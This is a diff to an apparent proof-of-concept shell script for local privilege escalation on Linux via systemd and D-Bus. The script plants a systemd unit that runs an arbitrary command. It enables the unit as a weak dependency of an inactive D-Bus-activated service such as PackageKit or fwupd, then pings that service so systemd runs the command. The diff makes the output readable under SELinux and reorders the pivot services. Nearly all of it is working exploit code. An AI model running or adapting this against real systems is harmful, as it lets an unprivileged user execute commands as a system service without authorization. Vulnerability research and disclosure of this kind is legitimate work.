@@ -26,7 +26,7 @@ set -eu
 RUN_ID="$( date +%s )$$"
 UNIT="${UNIT_PATH}/linnemanlabs-poc-${RUN_ID}.service"
 SD="org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager"
-DEFAULT_CMD='{ id; grep ^Cap /proc/self/status; } > /tmp/service.out-'"${RUN_ID}"
+DEFAULT_CMD='umask 0000;{ id; grep ^Cap /proc/self/status; } > /tmp/service.out-'"${RUN_ID}"';chcon -t user_tmp_t /tmp/service.out-'"${RUN_ID}"
 CMD=${CMD:-$DEFAULT_CMD}
 
 # confirm pivot service exists on this machine
@@ -36,17 +36,17 @@ is_cold(){ busctl call $SD GetUnit s "$1" 2>&1 | grep -q 'not loaded'; }
 
 PIVOT_NAME="" PIVOT_UNIT=""
 for pair in \
-  "org.freedesktop.locale1        systemd-localed.service" \
   "org.freedesktop.PackageKit     packagekit.service" \
   "org.freedesktop.Passim         passim.service" \
   "org.freedesktop.realmd         realmd.service" \
   "org.freedesktop.fwupd          fwupd.service" \
-  "org.freedesktop.bolt           bolt.service" \
   "org.freedesktop.GeoClue2       geoclue.service" \
   "org.freedesktop.ModemManager1  ModemManager.service" \
   "org.freedesktop.colord         colord.service" \
   "net.reactivated.Fprint         fprintd.service" \
   "org.freedesktop.timedate1      systemd-timedated.service" \
+  "org.freedesktop.bolt           bolt.service" \
+  "org.freedesktop.locale1        systemd-localed.service" \
   ; do
   set -- $pair
   if is_real "$1" && is_cold "$2"; then PIVOT_NAME="$1"; PIVOT_UNIT="$2"; break; fi
@@ -85,6 +85,9 @@ echo "[+] enabled - ${PIVOT_UNIT} now weakly depends on us"
 
 # ping the cold service to activate it, systemd fresh-loads it, reads our .wants, pulls our unit as weak dependency
 echo "[*] pinging ${PIVOT_NAME} to activate our dependency"
+# should re-try using next service on a ping failure instead of just returning true here
+# selinux/d-bus broker policy varies a lot, currently if the ping gets rejected because
+# that service isnt in our grants, we wont use any service, not ideal
 busctl call "${PIVOT_NAME}" / org.freedesktop.DBus.Peer Ping || true
 echo "[+] activated ${PIVOT_NAME} - check /tmp/service.out-${RUN_ID}"
 
